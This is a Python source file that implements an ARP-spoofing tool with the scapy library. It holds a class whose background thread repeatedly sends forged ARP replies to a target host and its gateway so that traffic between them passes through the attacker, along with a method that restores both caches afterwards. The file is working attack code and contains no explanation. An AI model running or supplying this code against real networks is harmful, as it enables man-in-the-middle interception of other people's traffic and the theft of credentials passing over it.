import time
import threading
from scapy.all import send
from scapy.layers.l2 import ARP

class ARPSpoof:
    def __init__(self, gatewayIP, gatewayMAC, targetIP, targetMAC):
        self.gatewayIP = gatewayIP
        self.gatewayMAC = gatewayMAC
        self.targetIP = targetIP
        self.targetMAC = targetMAC    

        self.run = False
    
    def __str__(self):
        return "ARPSpoof"    

    def restore_target(self):
        send(ARP(op=2, psrc=self.gatewayIP, pdst=self.targetIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.gatewayMAC), count=5)
        send(ARP(op=2, psrc=self.targetIP, pdst=self.gatewayIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.targetMAC), count=5)

        print("[*] MAC addresses of the gateway and the target have been restored")

    def start(self):
        th = threading.Thread(target=self.__poison_target)
        th.daemon = True
        th.start()
        return th

    def stop(self):
        self.run = False

    def __poison_target(self):
        poisonTarget = ARP()
        poisonTarget.op = 2
        poisonTarget.psrc = self.gatewayIP
        poisonTarget.pdst = self.targetIP
        poisonTarget.hwdst = self.targetMAC

        poisonGateway = ARP()
        poisonGateway.op = 2
        poisonGateway.psrc = self.targetIP
        poisonGateway.pdst = self.gatewayIP
        poisonGateway.hwdst = self.gatewayMAC

        print("[*] Beginning the ARP poisoning")

        self.run = True

        while self.run:            
            send(poisonTarget)
            send(poisonGateway)
            
            time.sleep(2)
